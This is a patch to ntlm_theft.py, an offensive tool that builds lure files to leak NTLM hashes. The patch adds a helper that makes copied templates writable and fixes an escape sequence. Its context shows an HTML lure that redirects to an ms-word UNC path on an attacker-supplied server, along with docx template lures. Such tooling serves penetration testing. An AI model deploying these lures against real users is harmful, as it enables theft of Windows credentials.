@@ -1,0 +1,68 @@
+Fix Nix store compatibility and Python 3.12+ escape sequence warning.
+
+1. Add copytree_writable() helper to fix permissions and timestamps when
+   copying from Nix store (read-only files with epoch 0 timestamps).
+2. Fix invalid escape sequence '\l' that causes SyntaxWarning in Python 3.12+.
+
+--- a/ntlm_theft.py
++++ b/ntlm_theft.py
+@@ -34,6 +34,23 @@
+ #the basic path of the script, make it possible to run from anywhere
+ script_directory = os.path.dirname(os.path.abspath(__file__))
+ 
++
++def copytree_writable(src, dest):
++    """
++    Copy directory tree ensuring files are writable with valid timestamps.
++    Needed when source files are read-only or have epoch 0 timestamps
++    (ZIP format requires dates >= 1980).
++    """
++    shutil.copytree(src, dest)
++    for dirpath, dirnames, filenames in os.walk(dest):
++        os.chmod(dirpath, 0o755)
++        os.utime(dirpath, None)
++        for name in filenames:
++            path = os.path.join(dirpath, name)
++            os.chmod(path, 0o644)
++            os.utime(path, None)
++
++
+ #arg parser to generate all or one file
+ #python ntlm_theft --generate all --ip 127.0.0.1 --filename board-meeting2020
+ parser = argparse.ArgumentParser(
+@@ -165,7 +182,7 @@
+ 	file.write('''<!DOCTYPE html>
+ <html>
+ 	<script>
+-		location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
++		location.href = 'ms-word:ofe|u|\\''' + server + '''\\leak\\leak.docx';
+ 	</script>
+ </html>''')
+ 	file.close()
+@@ -179,7 +196,7 @@
+ 	dest = os.path.join("docx-includepicture-template")
+ 	# Copy the content of  
+ 	# source to destination  
+-	shutil.copytree(src, dest)  
++	copytree_writable(src, dest)  
+ 	documentfilename = os.path.join("docx-includepicture-template", "word", "_rels", "document.xml.rels")
+ 	# Read the template file
+ 	file = open(documentfilename, 'r')
+@@ -206,7 +223,7 @@
+ 	dest = os.path.join("docx-remotetemplate-template")
+ 	# Copy the content of  
+ 	# source to destination  
+-	shutil.copytree(src, dest)  
++	copytree_writable(src, dest)  
+ 	documentfilename = os.path.join("docx-remotetemplate-template", "word", "_rels", "settings.xml.rels")
+ 	# Read the template file
+ 	file = open(documentfilename, 'r')
+@@ -231,7 +248,7 @@
+ 	dest = os.path.join("docx-frameset-template")
+ 	# Copy the content of  
+ 	# source to destination  
+-	shutil.copytree(src, dest)  
++	copytree_writable(src, dest)  
+ 	documentfilename = os.path.join("docx-frameset-template", "word", "_rels", "webSettings.xml.rels")
+ 	# Read the template file
+ 	file = open(documentfilename, 'r')
